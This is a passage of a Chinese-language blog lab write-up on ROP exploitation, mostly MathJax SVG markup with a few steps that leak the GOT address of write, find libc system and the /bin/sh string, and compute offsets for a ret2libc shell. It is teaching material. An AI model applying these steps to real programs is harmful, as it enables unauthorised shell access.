data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(3225,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(3745,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4473.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(5529.6,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2000,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(2500,0)"></path></g><g data-mml-node="mi" transform="translate(3389,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(3918,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(4340,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(10848.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(11849.1,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1389,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(1811,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(14639.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(15639.7,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(1311,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(17985.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(19041.3,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2000,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(2500,0)"></path></g><g data-mml-node="mi" transform="translate(3389,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(3818,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(4240,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container><br>
<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-1.png" class=""></p>
</div>
</li>
<li>
<p>继续运行程序，在寄存器中可以看到 got 表泄露的 <code>write</code> 绝对地址 <code>0xf7644b70</code> 与其在程序中的地址 <code>0x804a014</code>。<code>write</code> 函数所在 got 表中的相对偏移量为 + 20，说明 got 表的基地址为 <code>0x804a000</code>。立刻执行 <code>print system</code>，看到此时 <code>libc_system</code> 的地址是 <code>0xf75a9da0</code>。</p>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-2.png" class="" title="得知got表和libc_system的地址">
</li>
<li>
<p>执行 <code>plt</code> 命令，看到 <code>write</code> 函数的 <code>plt</code> 地址为 <code>0x8048320</code>。</p>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-5.png" class="">
</li>
<li>
<p>使用 <code>vmmap</code> 和 <code>find</code> 命令寻找 <code>/bin/sh</code> 的地址。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-4.png" class="" title="字符串/bin/sh的地址为0xf76caa0b"></div></div></div>
</li>
<li>
<p>计算字符串 <code>/bin/sh</code> 相对偏移量为 <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.681ex;" xmlns="http://www.w3.org/2000/svg" width="41.222ex" height="2.378ex" role="img" focusable="false" viewBox="0 -750 18220.3 1050.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mn" transform="translate(939,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mi" transform="translate(1939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(2372,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(2901,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(3430,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mi" transform="translate(3930,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(4359,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(4781,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(5760.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(6760.6,0)"><g data-mml-node="mrow"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 